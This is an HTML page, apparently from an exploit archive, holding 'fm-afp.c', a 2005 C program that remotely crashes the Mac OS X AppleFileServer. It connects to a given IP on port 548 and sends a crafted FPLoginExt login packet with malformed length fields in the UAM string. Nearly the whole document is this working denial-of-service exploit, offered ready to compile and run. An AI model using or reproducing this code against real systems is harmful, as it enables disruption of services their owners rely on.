<html><head><title>Mac OS X AppleFileServer Remote Denial of Service Exploit</title></head><pre>/* [ fm-afp.c ]
* -( nemo @ felinemenace.org )- 2005
*
* Code for afp bug found by Braden Thomas.
*
* Again hello to everyone @ irc.pulltheplug.org
*
* need a challenge? -( http://pulltheplug.org )-
*/

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/time.h&gt;

#define UAMSIZE    1022
#define AFPVERSIZE 5
#define PATHSIZE   30
#define UASIZE     30
#define AFPNSIZE   5
#define AFPPORT    548
#define BUFSIZE sizeof(dsi)+sizeof(fploginext) //+LEN+sizeof(afpEnd)

typedef struct { char AFPVER[AFPVERSIZE]  ;} AFPVER_T;
typedef struct { char UAM[UAMSIZE]        ;} UAM_T;
typedef struct { char PATH[PATHSIZE]      ;} PATH_T;
typedef struct { char UserAuthInfo[UASIZE];} UserAuth_t;
typedef struct { char AFPName[AFPNSIZE]   ;} AFPName_t;

typedef struct dsi { // Data Stream Interface.
       u_int8_t  req;
       u_int8_t  com;
       u_int16_t id;
       u_int32_t offset;
       u_int32_t len;
       u_int32_t reserved;
} DSI_T;

typedef struct FPLoginExt { // Establishes a session with a server using an Open Directory domain.
       u_int8_t   command;
       u_int8_t   pad;
       u_int16_t  flags;
       AFPVER_T   AFPVER;
       UAM_T      UAM;
       u_int8_t   UserNameType;
       AFPName_t  UserName;
       u_int8_t   PathType;
       PATH_T     Pathname;
       u_int8_t   pad2;
       UserAuth_t UserAuthInfo;
} FP_LoginExt_T;

DSI_T dsi;
FP_LoginExt_T fploginext;

void banner()
{
       printf(&quot; [ fm-afp.c ]\n&quot;);
       printf(&quot;-( nemo@felinemenace.org )-\n\n&quot;);
}

void usage(char *progname)
{
       printf(&quot;usage: %s &lt;ip address&gt;.\n&quot;,progname);
       exit(1);
}

int connect_afp(char *ip,int *sockfd)
{
       struct sockaddr_in target_addr;
       int len;

       *sockfd = socket(AF_INET, SOCK_STREAM, 0);

       target_addr.sin_family = AF_INET;
       target_addr.sin_port = htons(AFPPORT);
       inet_aton(ip, &amp;(target_addr.sin_addr));
       memset(&amp;(target_addr.sin_zero), '\0', 8);

       if (connect(*sockfd, (struct sockaddr *)&amp;target_addr, sizeof(struct sockaddr)) == -1) {
               return 1;
       }
       return 0;
}

void generate_packet(char *packet)
{
       int n;

       dsi.req       = '\x00';
       dsi.com       = '\x02';
       dsi.id        = (u_int16_t)0x0002;
       dsi.offset    = 0x00000000;
       dsi.len       = 0x00000434;
       dsi.reserved  = 0x00000000;

       fploginext.command = (u_int8_t)'\x3f';
       fploginext.pad     = (u_int8_t)'\x00';
       fploginext.flags   = (u_int16_t)0x0000;
       memcpy((char *)&amp;(fploginext.AFPVER),&quot;\x04\x6e\x65\x6d\x6f&quot;,5);
       memset((char*)((&amp;fploginext.UAM)),'\x70',sizeof(fploginext.UAM));
       fploginext.UAM.UAM[0] = '\x0f';
       fploginext.UAM.UAM[1] = '\xff';
       fploginext.UAM.UAM[257] = '\xff';               //      size of next string.
       fploginext.UAM.UAM[258] = '\xff';               //
       fploginext.UAM.UAM[500] = '\x00';               //      size of next string.
       fploginext.UAM.UAM[501] = '\xf0';               //

       fploginext.UserNameType = (u_int8_t)'\x11';
       memcpy((char *)&amp;(fploginext.UserName),&quot;\x54\x6e\x65\x6d\x6f&quot;,5);
       fploginext.PathType = (u_int8_t)'\xff';
       memcpy((char *)&amp;(fploginext.Pathname),&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;,30);
       fploginext.pad2 = (u_int8_t)'\xff';
       memcpy((char *)&amp;(fploginext.UserAuthInfo),&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;,30);

       memcpy(packet, &amp;dsi, sizeof(dsi));
       packet += sizeof(dsi);
       memcpy(packet, &amp;fploginext, sizeof(fploginext));
}

int send_packet(char *packet,int *sockfd)
{
       if (send(*sockfd, packet, BUFSIZE, 0) == -1) {
               return 1;
       }

       return 0;
}

int main(int ac, char **av)
{
       int sockfd;
       char packet[BUFSIZE];
       struct timeval time;

       banner();
       if(ac != 2) {
               usage(*av);
       }
       printf(&quot;[+] Connecting to target: %s.\n&quot;,av[1]);
       if(connect_afp(av[1],&amp;sockfd)) {
               printf(&quot;[-] An error has occured connecting to the target.\n&quot;);
               exit(1);
       }

       printf(&quot;[+] Generating malicious packet.\n&quot;);
       generate_packet(packet);

       printf(&quot;[+] Sending packet to target.\n&quot;);
       if(send_packet(packet,&amp;sockfd)) {
               printf(&quot;[-] Error sending packet.\n&quot;);
               close(sockfd);
               exit(1);
       }

       fd_set mySet;
       FD_ZERO(&amp;mySet);
       FD_SET(sockfd, &amp;mySet);
       time.tv_sec = 0;
       time.tv_usec = 50;
       select(sockfd+1, &amp;mySet, NULL, NULL, &amp;time);

       close(sockfd);
       return 0;
}

// milw0rm.com [2005-02-08]</pre></html>